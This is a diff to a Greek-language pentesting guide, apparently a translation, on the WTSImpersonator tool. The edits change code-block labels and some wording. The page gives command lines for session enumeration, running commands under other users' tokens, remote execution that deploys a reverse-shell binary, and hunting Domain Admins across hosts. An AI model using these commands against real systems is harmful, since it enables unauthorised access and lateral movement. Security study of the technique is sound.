@@ -5,7 +5,7 @@
 ### Κύρια Λειτουργικότητα
 
 Το εργαλείο λειτουργεί μέσω μιας ακολουθίας κλήσεων API:
-```powershell
+```bash
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
 ### Κύρια Μodule και Χρήση
@@ -13,35 +13,35 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → 
 - **Καταμέτρηση Χρηστών**: Η τοπική και απομακρυσμένη καταμέτρηση χρηστών είναι δυνατή με το εργαλείο, χρησιμοποιώντας εντολές για κάθε σενάριο:
 
 - Τοπικά:
-```powershell
+```bash
 .\WTSImpersonator.exe -m enum
 ```
 - Απομακρυσμένα, καθορίζοντας μια διεύθυνση IP ή όνομα υπολογιστή:
-```powershell
+```bash
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
 - **Εκτέλεση Εντολών**: Τα modules `exec` και `exec-remote` απαιτούν ένα **Service** context για να λειτουργήσουν. Η τοπική εκτέλεση χρειάζεται απλώς το εκτελέσιμο WTSImpersonator και μια εντολή:
 
 - Παράδειγμα για τοπική εκτέλεση εντολής:
-```powershell
+```bash
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- PsExec64.exe μπορεί να χρησιμοποιηθεί για να αποκτήσει ένα service context:
-```powershell
+- Το PsExec64.exe μπορεί να χρησιμοποιηθεί για να αποκτήσει ένα service context:
+```bash
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
 - **Απομακρυσμένη Εκτέλεση Εντολών**: Περιλαμβάνει τη δημιουργία και εγκατάσταση μιας υπηρεσίας απομακρυσμένα, παρόμοια με το PsExec.exe, επιτρέποντας την εκτέλεση με κατάλληλες άδειες.
 
 - Παράδειγμα απομακρυσμένης εκτέλεσης:
-```powershell
+```bash
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **Module Εξακρίβωσης Χρηστών**: Στοχεύει συγκεκριμένους χρήστες σε πολλές μηχανές, εκτελώντας κώδικα με τα διαπιστευτήριά τους. Αυτό είναι ιδιαίτερα χρήσιμο για την στόχευση Domain Admins με τοπικά δικαιώματα διαχειριστή σε αρκετά συστήματα.
+- **Module Εντοπισμού Χρηστών**: Στοχεύει συγκεκριμένους χρήστες σε πολλές μηχανές, εκτελώντας κώδικα υπό τις διαπιστεύσεις τους. Αυτό είναι ιδιαίτερα χρήσιμο για την στόχευση Domain Admins με τοπικά δικαιώματα διαχειριστή σε αρκετά συστήματα.
 - Παράδειγμα χρήσης:
-```powershell
+```bash
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
 
